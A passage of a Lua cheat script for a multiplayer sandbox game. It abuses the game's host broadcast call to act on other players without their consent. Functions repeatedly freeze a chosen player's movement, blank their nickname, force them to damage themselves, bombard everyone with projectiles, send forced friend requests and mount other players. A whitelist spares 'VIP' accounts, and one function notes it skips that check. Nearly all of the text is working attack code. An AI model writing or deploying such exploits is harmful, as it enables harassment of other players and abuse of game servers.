            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始控制")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                        _G.sd_enabled = false  -- 停止本次
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffff已选择玩家：" .. targetUin .. "，开始循环速度控制")
                
                -- 启动速度控制循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.sd_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 速度控制代码 =====
                        -- 参数说明：{uin, x速度, y速度, z速度}
                        -- 设置0,0,0可以让玩家无法移动
                        local tdata = {}
                        tdata[1] = "actor"
                        tdata[2] = "appendSpeed"
                        tdata[3] = {targetUin, 1, 0, 1}  -- 停止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        -- =======================
                        
                        -- 每10次显示一次提示
                        
                        
                        threadpool:wait(0.1)  -- 0.1秒执行一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000速度控制循环结束")
                end)
            end
            -- ====================
        end
    end
)
end


function jywj()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 修改玩家名字功能（选择目标后立即修改）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边取消\n右边选择目标禁言",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：取消
            ShowGameTipsWithoutFilter("#cFF0000已取消")
            
        elseif btnType == 1 then  -- 右边按钮：选择目标
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择要禁言的玩家",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要禁言的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击禁言")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                -- ===== 修改名字代码（只执行一次）=====
                local tdata = {}
                tdata[1] = "actor"
                tdata[2] = "setnickname"
                tdata[3] = {targetUin, " "}
                
                pcall(function() 
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    ShowGameTipsWithoutFilter("#c00ffff已修改玩家 " .. targetUin .. " 的禁言")
                end)
                -- ===================================
            end
        end
    end
)
end


function wjzc()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 玩家自残功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止自残\n右边开启自残并选择目标",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止自残 =====
            _G.zc_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000自残已停止")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启自残 =====
            _G.zc_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
                _G.zc_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000当前房间没有其他玩家")
                _G.zc_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "选择自残目标",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要自残的玩家")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aad玩家列表")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aad点击开始自残")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
                        _G.zc_enabled = false  -- 停止本次秒杀
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffff已选择玩家：" .. targetUin .. "，开始循环自残")
                
                -- 启动自残循环
                threadpool:work(function()
                    local loopCount = 0
                    local myUin = AccountManager:getUin()
                    
                    while _G.zc_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 自残代码 =====
                        -- 参数说明：{攻击者UIN, 受害者UIN, 伤害值, 未知参数}
                        -- 这里让玩家攻击自己（自残）
                        local tdata = {
                            [1] = "actor",
                            [2] = "playerHurt",
                            [3] = {targetUin, targetUin, 5000, 0}  -- 自己打自己
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                        end)
                        -- ===================
                        
              
                        
                        threadpool:wait(0.1)  -- 0.2秒自残一次
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000自残循环结束，")
                end)
            end
            -- ====================
        end
    end
)
end

function ztmn()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 炸图模拟器功能（左边停止，右边开启）
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止炸图\n右边开启炸图",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止炸图 =====
            _G.ztmn_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000炸图已停止")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启炸图 =====
            _G.ztmn_enabled = true
            ShowGameTipsWithoutFilter("#c00ffff炸图已开启")
            
            -- 启动炸图循环
            threadpool:work(function()
                while _G.ztmn_enabled do
                    -- 获取当前房间所有玩家
                    local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                    local myUin = AccountManager:getUin()
                    
                    for i = 1, size do
                        if not _G.ztmn_enabled then break end
                        
                        local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                        if targetPlayer then
                            local targetUin = targetPlayer:getUin()
                            if targetUin ~= myUin then
                                -- 获取目标位置
                                local x, z, y = targetPlayer:getPosition(0, 0, 0)
                                local scaled_x, scaled_y, scaled_z = x * 0.01, y * 0.01, z * 0.01
                                
                                -- 获取自己位置
                                local my_x, my_y, my_z = CurMainPlayer:getPosition(0, 0, 0)
                                local new_x, new_y, new_z = my_x / 100, my_y / 100, my_z / 100
                                
                                -- 发射投掷物（火龙果）
                                local tdata = {
                                    [1] = "world",
                                    [2] = "spawnProjectile",
                                    [3] = {myUin, 15056, new_x, new_y, new_z, scaled_x, scaled_y, scaled_z, 500}
                                }
                                pcall(function() 
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                                end)
                            end
                        end
                    end
                    
                    threadpool:wait(0.1)  -- 0.1秒发射一轮
                end
            end)
            -- ====================
        end
    end
)
end
function gbtk()
-- 改变天空功能（左边停止，右边开启）
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MessageBoxInterface"):dualBtnBox(
    "左边停止天空闪烁\n右边开启天空闪烁",  -- 消息内容
    "关闭",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止天空闪烁 =====
            _G.skybox_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000天空闪烁已停止")
            
            -- 恢复默认天空盒
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.skybox_enabled then
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxMaps",
                        [3] = {0, 0, ""}
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    end)
                    ShowGameTipsWithoutFilter("#c00ffff已恢复默认天空盒")
                end
            end)
            -- =========================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启天空闪烁 =====
            _G.skybox_enabled = true
            ShowGameTipsWithoutFilter("#c00ffff天空闪烁已开启")
            
            -- 启动天空闪烁循环
            threadpool:work(function()
                local skyboxIds = {30001, 30002, 30003, 30004, 30005, 30006, 30007, 30008, 30009, 30010, 30011, 30012}
                local index = 1
                
                while _G.skybox_enabled do
                    -- 设置天空盒
                    local tdata = {
                        [1] = "world",
                        [2] = "SetSkyBoxMaps",
                        [3] = {1, skyboxIds[index], ""}
                    }
                    pcall(function() 
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                    end)
                    
                    -- 切换到下一个
                    index = index + 1
                    if index > #skyboxIds then index = 1 end
                    
                    threadpool:wait(0.2)  -- 0.3秒切换一次
                end
            end)
            -- =========================
        end
    end
)
end


function sjls()
    -- 先检查是否在游戏中
    if not ClientCurGame or not ClientCurGame:isInGame() then
        ShowGameTipsWithoutFilter("#cFF0000请先进入游戏房间")
        return
    end
    
    tdata = {}
    tdata[1] = "world";
    tdata[2] = "SetTimeVanishingSpeed";
    tdata[3] = {100}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function czzy()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    local size = 10
    local start_x = base_x + 5
    local top_y = base_y + size
    
    for dx = 0, size - 1 do
        local current_x = start_x + dx
        for dy = 0, size - 1 do
            local current_y = base_y + dy
            for dz = 0, size - 1 do
                local current_z = base_z - dz
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 835, current_x, current_y, current_z, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
    
    local gap = (size - 1) / 4
    for i = 0, 4 do
        local pos_x = start_x + i * gap
        local pos_z = base_z - (size - 1) / 2
        local pos_y = top_y + 0.5
        
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 6, pos_x, pos_y, pos_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end

function tdwg()
for a = 0, 100000 do
        threadpool:wait(0.1)
        local tdata1 = {
            [1] = "graphics",
            [2] = "createGraphicsTxtByActor",
            [3] = { AccountManager:getUin(), { title = "#cFFAAFF漫山#cFFBBEE遍野#cFFCCDD的花 #cFFDDCC终会#cFFEEBB开", fontsize = 20, apha = 5, itype = 2, Type = 'GRAPHICS.GRAPHICS_HORNBOOK' }, { x = 0, y = 160, z = 0 }, 1.2, 0, 115 }
        }
        local tdata2 = {
            [1] = "graphics",
            [2] = "createGraphicsImageByActor",
            [3] = { AccountManager:getUin(), { imgid = 10099, scale = 0.7, apha = 90, id = 1, Type = 'GRAPHICS.GRAPHICS_IMAGE' }, { x = 0, y = 50, z = 0 }, 1, 0, 150 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end
end

function qseb()
 getglobal("AccChangeColorBtn"):Show()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        getglobal("AccSummonBtn"):SetPoint("right", "AccRideChangeBtn", "left", -80, 0)
        threadpool:work(function()
            getglobal("AccSummonBtn"):Show()
            
            function AccSummonBtn_OnClick()
                math.randomseed(os.time() + math.random())
                local idList = {
                    "mob_3101", "mob_3101", "mob_3102", "mob_3105", "mob_3107",
                    "mob_3109", "mob_3121", "mob_3130", "mob_3131", "mob_3244",
                    "mob_3255", "mob_3411", "mob_3416", "mob_3418", "mob_3419",
                    "mob_3419", "mob_3420", "mob_3425", "mob_3502", "mob_3521",
                    "mob_3600", "mob_3601", "mob_3608", "mob_3803"
                }
                
                if #idList == 0 then
                    ShowGameTipsWithoutFilter("idList is empty")
                    return
                end
                
                local randomIndex = math.random(1, #idList)
                local selectedId = idList[randomIndex]
                
                local tdata = {
                    [1] = "actor",
                    [2] = "changeCustomModel",
                    [3] = { AccountManager:getUin(), selectedId }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter("" .. selectedId)
            end
        end)
    end
end

function sjyd()
  getglobal("AccChangeColorBtn"):Show()
for a = 0, 100000 do
        threadpool:wait(0.1)
        getglobal("EditorBackBtn"):SetPoint("bottomleft", "PlayMainFrame", "bottomleft", 1120, -400)
        threadpool:work(function()
            getglobal("EditorBackBtn"):Show()
            
            function EditorBackBtn_OnClick()
                for a = 0, 5 do
                    threadpool:wait(0.01)
                    CurMainPlayer:playSkinAct(20, AccountManager:getUin(), AccountManager:getUin())
                end
            end
        end)
    end
end

function csfy()
    if not ClientCurGame or ClientCurGame._originalSendChat then return end
    
    local START_R, START_G, START_B = 255, 170, 255
    local END_R, END_G, END_B = 255, 238, 187
    
    local function padHex(num) return string.format("%02X", num) end
    
    local function getGradientColor(index, total)
        if total <= 1 then return "#c" .. padHex(START_R) .. padHex(START_G) .. padHex(START_B) end
        local ratio = (index - 1) / (total - 1)
        local r = math.floor(START_R + (END_R - START_R) * ratio + 0.5)
        local g = math.floor(START_G + (END_G - START_G) * ratio + 0.5)
        local b = math.floor(START_B + (END_B - START_B) * ratio + 0.5)
        return "#c" .. padHex(r) .. padHex(g) .. padHex(b)
    end
    
    local function applyColorToText(str)
        local ok, rawStr = pcall(tostring, str or "")
        if not ok or rawStr == "" then return str or "" end
        
        local char_list = {}
        local i = 1
        while i <= #rawStr do
            local c = rawStr:byte(i)
            local len = 1
            if c >= 192 and c <= 223 then len = 2
            elseif c >= 224 and c <= 239 then len = 3
            elseif c >= 240 and c <= 247 then len = 4 end
            table.insert(char_list, rawStr:sub(i, i + len - 1))
            i = i + len
        end
        
        local result = {}
        for idx, char in ipairs(char_list) do
            table.insert(result, getGradientColor(idx, #char_list) .. char)
        end
        return table.concat(result)
    end
    
    local originalSendChat = ClientCurGame.sendChat
    ClientCurGame._originalSendChat = originalSendChat
    
    function ClientCurGame:sendChat(originalMsg)
        local coloredMsg = originalMsg
        local ok, res = pcall(applyColorToText, originalMsg)
        if ok then coloredMsg = res end
        
        if type(originalSendChat) == "function" then
            originalSendChat(self, coloredMsg)
        else
            ClientCurGame.sendChat(self, coloredMsg)
        end
    end
end

function czjb()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    for dx = -1, 1 do
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 1, base_x + dx, base_y, base_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
    
    for dy = 1, 3 do
        local tdata = {
            [1] = "block",
            [2] = "placeBlock",
            [3] = { 1, base_x, base_y + dy, base_z, 0, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end

function czjy()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local base_x, base_y, base_z = x / 100, y / 100, z / 100
    
    -- 中型监狱尺寸
    local width = 15      -- X轴方向宽度
    local height = 8      -- Y轴方向高度
    local depth = 15      -- Z轴方向深度
    
    local start_x = base_x + 5   -- 从玩家位置稍微偏移
    local start_y = base_y       -- 从玩家脚下开始
    local start_z = base_z - 8   -- 向后偏移
    
    print("开始创建中型露天监狱（15x8x15）")
    
    -- 创建四周墙壁和地板
    for dx = 0, width - 1 do
        for dy = 0, height - 1 do
            for dz = 0, depth - 1 do
                
                -- 墙壁或地板（不包括顶部）
                local isWall = (dx == 0 or dx == width - 1 or    -- 前后墙
                               dz == 0 or dz == depth - 1 or    -- 左右墙
                               dy == 0)                          -- 地板
                
                if isWall and dy < height - 1 then  -- 排除顶部
                    local current_x = start_x + dx
                    local current_y = start_y + dy
                    local current_z = start_z + dz
                    
                    local tdata = {
                        [1] = "block",
                        [2] = "placeBlock",
                        [3] = { 1, current_x, current_y, current_z, 0, -1 }
                    }
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                end
            end
        end
    end
    
    -- 放置顶部空气方块
    local top_y = start_y + height - 1
    for dx = 0, width - 1 do
        for dz = 0, depth - 1 do
            local current_x = start_x + dx
            local current_z = start_z + dz
            
            local air_data = {
                [1] = "block",
                [2] = "placeBlock",
                [3] = { 1001, current_x, top_y, current_z, 0, -1 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, air_data)
        end
    end
    
    -- 创建入口（正面中间）
    local doorX = start_x + math.floor(width / 2)
    local doorY = start_y + 1
    local doorZ = start_z
    
    print("中型露天监狱创建完成！")
    print("- 尺寸：宽15 x 高8 x 深15")
    print("- 入口位置：X="..doorX..", Y="..doorY..", Z="..doorZ)
end
                   



-- ==================== 基础功能 ====================
function czhh()
-- 生成五层巨型花环（每层明显分开）

    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local center_x, center_y, center_z = x / 100, y / 100, z / 100
    
    -- 五层鲜花ID
    local flowerIds = {200398, 200405, 200417, 200398, 200405,200398,200405,200417,200398,200417,200405}
    
    -- 五层半径：15, 30, 45, 60, 75米（稍微拉大间距）
    local radius = {5.0,10.0,15.0,20.0,25.0, 30.0,35.0,40.0, 45.0, 60.0, 75.0}
    
    -- 五层花朵数量（按周长比例增加）
    local flowerCount = {
    math.floor(2 * math.pi * 5 * 0.8),   -- 约75朵
    math.floor(2 * math.pi * 10 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 15 * 0.8), 
        math.floor(2 * math.pi * 20 * 0.8),   -- 约75朵  
        math.floor(2 * math.pi * 25 * 0.8),   -- 约75朵
        
        math.floor(2 * math.pi * 30 * 0.8),   -- 约150朵
        math.floor(2 * math.pi * 35 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 40 * 0.8),   -- 约75朵
        math.floor(2 * math.pi * 45 * 0.8),   -- 约226朵
        math.floor(2 * math.pi * 60 * 0.8),   -- 约301朵
        math.floor(2 * math.pi * 75 * 0.8)    -- 约377朵
    }
    
    ShowGameTipsWithoutFilter("#c00ff00开始生成十一层巨型花环")
    ShowGameTipsWithoutFilter("#c00ff00总花朵数约" .. (flowerCount[1]+flowerCount[2]+flowerCount[3]+flowerCount[4]+flowerCount[5]+flowerCount[6]+flowerCount[7]+flowerCount[8]+flowerCount[9]+flowerCount[10]+flowerCount[11]) .. "朵")
    
    -- 地面基础高度
    local ground_y = center_y + 0.2
    
    for layer = 1, 11 do
        local currentFlowerId = flowerIds[layer]
        local currentRadius = radius[layer]
        local currentCount = flowerCount[layer]
        
        ShowGameTipsWithoutFilter("#cFFAA00正在生成第" .. layer .. "层，半径" .. currentRadius .. "米，间距" .. (radius[layer] - (radius[layer-1] or 0)) .. "米")
        
        for i = 1, currentCount do
            -- 均匀分布角度
            local angle = (i - 1) * (2 * math.pi / currentCount)
            
            -- 稍微加一点随机偏移，让花环更自然（但不影响层间距）
            local rand_angle = (math.random() - 0.5) * 0.1
            local rand_radius = (math.random() - 0.5) * 0.3
            local final_angle = angle + rand_angle
            local final_radius = currentRadius + rand_radius
            
            -- 计算坐标
            local offset_x = math.cos(final_angle) * final_radius
            local offset_z = math.sin(final_angle) * final_radius
            
            local flower_x = center_x + offset_x
            local flower_z = center_z + offset_z
            
            -- 所有花都种在地上
            local tdata = {
                [1] = "block",
                [2] = "placeBlock",
                [3] = { currentFlowerId, flower_x, ground_y, flower_z, 0, -1 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            
            threadpool:wait(0.003)
        end
        
        threadpool:wait(0.1)
    end
    

end

function zdhy()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "SendFriendApply",
            [3] = { uin, AccountManager:getUin() }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "强制好友")
end


function jxfk()
for a = 0, 100000 do
        threadpool:wait(0.1)
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, (y / 100) - 1, z / 100
    local tdata = {
        [1] = "block",
        [2] = "placeBlock",
        [3] = { 1, new_x, new_y, new_z, 0, -1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end
end


function qxwj()
    ShowPlayerList(function(uin)
        -- Đã bỏ qua đoạn kiểm tra whitelist, dùng được cho tất cả mọi người
        local tdata = {
            [1] = "player",
            [2] = "mountActor",
            [3] = { AccountManager:getUin(), uin, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "骑上玩家")
end


function Fxms(aa)
    threadpool:work(function()
        if ClientCurGame:isInGame() then
            threadpool:wait(0.01)
            CurMainPlayer:setFlying(aa)
        else
            ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
        end
    end)
end

function ydfh(aa)
    if CurWorld and CurMainPlayer then
        trigger()
        local HP = GameVM.Trigger.Player:getPlayerAttr(AccountManager:getUin(), PLAYERATTR.CUR_HP)
        if HP < 0 then
            ClientCurGame:getMainPlayer():revive(1)
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { AccountManager:getUin(), 520, 23 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

function ydfh_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aad开启成功')
    ydfh_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aad未进入地图，开启失败")
                break
            end
            ydfh(aa)
            threadpool:wait(0.01)
            if not ydfh_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aad关闭成功")
                break
            end
        end
    end)
end

function wdtz(aa)
    CurMainPlayer:tryShapeShift(80)
    CurMainPlayer:jumpOnce()
end

function wdtz_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aad开启成功')
    wdtz_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
                break
            end
            wdtz(aa)
            threadpool:wait(0.1)
            if not wdtz_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aad关闭成功")
                break
            end
        end
    end)
end

function rwdx()
    if ClientCurGame:isInGame() then
        local player = CurMainPlayer
        player:setCustomScale(4)
        player:syncCustomScale()
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function rwtx()
    if ClientCurGame:isInGame() then
        for i = 1, #effectNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { AccountManager:getUin(), effectNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function rwjs_speed()
    if ClientCurGame:isInGame() then
        GameVM.Creature:setWalkSpeed(AccountManager:getUin(), 100)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function zhjqr()
    if ClientCurGame:isInGame() then
        local content = { summonid = "4901", objid = AccountManager:getUin() }
        SandboxLuaMsg.sendToHost("AVATAR_SUMMON_TOHOST", content)
        ShowGameTipsWithoutFilter("#cFF7aad部分房间用不了")
    else
        ShowGameTipsWithoutFilter("#cFF7aad请先进入房间")
    end
end

function zdjqr()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local content = { summonid = "4901", objid = uin }
        SandboxLuaMsg.sendToHost("AVATAR_SUMMON_TOHOST", content)
    end, "指定机器人")
end

function zdkr()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("#R禁止对VIP使用此功能", 3)
        else
            ShowGameTips("#R禁止对VIP使用此功能", 3)
        end
        return
    end
        local content = {
            msg = "transfer_invited",
            inviterUin = AccountManager:getUin(),
